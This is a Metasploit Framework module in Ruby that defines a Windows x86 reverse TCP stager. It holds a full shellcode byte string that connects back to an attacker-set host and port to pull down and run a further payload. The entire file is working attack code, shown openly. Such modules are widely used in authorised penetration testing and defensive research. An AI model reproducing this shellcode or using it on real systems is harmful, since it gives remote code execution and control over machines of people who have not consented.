##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 177

  include Msf::Payload::Stager
  include Msf::Payload::Windows

  def self.handler_type_alias
    'reverse_nonx_tcp'
  end

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Reverse TCP Stager (No NX or Win7)',
        'Description' => 'Connect back to the attacker (No NX)',
        'Author' => 'vlad902',
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_X86,
        'Handler' => Msf::Handler::ReverseTcp,
        'Convention' => 'sockedi',
        'Stager' => {
          'Offsets' =>
                  {
                    'LHOST' => [ 142, 'ADDR' ],
                    'LPORT' => [ 148, 'n' ]
                  },
          'Payload' =>
                       "\xfc\x6a\xeb\x47\xe8\xf9\xff\xff\xff\x60\x31\xdb\x8b\x7d\x3c\x8b" \
                       "\x7c\x3d\x78\x01\xef\x8b\x57\x20\x01\xea\x8b\x34\x9a\x01\xee\x31" \
                       "\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x84\xc0\x75\xf6\x43\x66\x39\xca" \
                       "\x75\xe3\x4b\x8b\x4f\x24\x01\xe9\x66\x8b\x1c\x59\x8b\x4f\x1c\x01" \
                       "\xe9\x03\x2c\x99\x89\x6c\x24\x1c\x61\xff\xe0\x31\xdb\x64\x8b\x43" \
                       "\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\x5e\x66\x53\x66\x68" \
                       "\x33\x32\x68\x77\x73\x32\x5f\x54\x66\xb9\x72\x60\xff\xd6\x95\x53" \
                       "\x53\x53\x53\x43\x53\x43\x53\x89\xe7\x66\x81\xef\x08\x02\x57\x53" \
                       "\x66\xb9\xe7\xdf\xff\xd6\x66\xb9\xa8\x6f\xff\xd6\x97\x68\x7f\x00" \
                       "\x00\x01\x66\x68\x11\x5c\x66\x53\x89\xe3\x6a\x10\x53\x57\x66\xb9" \
                       "\x57\x05\xff\xd6\x50\xb4\x0c\x50\x53\x57\x53\x66\xb9\xc0\x38\xff" \
                       "\xe6"
        }
      )
    )
  end
end
